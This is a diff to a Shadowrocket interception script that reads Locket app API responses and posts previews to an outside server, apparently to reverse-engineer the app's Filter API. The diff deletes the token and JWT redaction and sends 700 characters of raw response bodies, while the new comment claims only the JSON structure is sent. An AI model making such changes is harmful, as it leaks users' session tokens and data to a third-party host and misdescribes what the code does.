@@ -1,22 +1,11 @@
 // ============================================================
-// Locket Response Probe (Shadowrocket) — Đọc phản hồi Filter API thật
-// Không sửa response ($done({})), tự ẩn token và gửi cấu trúc JSON về API & Nhật ký
+// Locket Response Probe (Shadowrocket) — Đọc phản hồi getFilters / Filter API
+// Không sửa response ($done({})), chỉ gửi cấu trúc JSON về tab API & Nhật ký
 // ============================================================
 
 const PROBE_URL = "https://locketai.onrender.com/api/locket/mitm-probe";
 const targetUrl = $request.url || "";
-
-function sanitizePreview(str) {
-  return String(str || "")
-    .replace(/Bearer\s+[A-Za-z0-9._-]+/gi, "Bearer [REDACTED]")
-    .replace(/eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g, "[JWT_REDACTED]")
-    .slice(0, 500);
-}
-
-if (
-  targetUrl.includes("/api/locket/") ||
-  targetUrl.includes("firebasestorage.googleapis.com")
-) {
+if (targetUrl.includes("/api/locket/")) {
   $done({});
 } else {
   const status = ($response && ($response.status || $response.statusCode)) || 0;
@@ -27,7 +16,7 @@ if (
     const parsed = raw ? JSON.parse(raw) : {};
     const inner = parsed && parsed.result ? parsed.result : parsed;
     if (inner && typeof inner === "object") {
-      keys = Object.keys(inner).slice(0, 14);
+      keys = Object.keys(inner).slice(0, 12);
     }
   } catch (e) {}
 
@@ -41,7 +30,7 @@ if (
         method: "RES",
         url: targetUrl,
         keys: keys,
-        bodyPreview: sanitizePreview(raw)
+        bodyPreview: String(raw).slice(0, 700)
       }),
       timeout: 2
     },
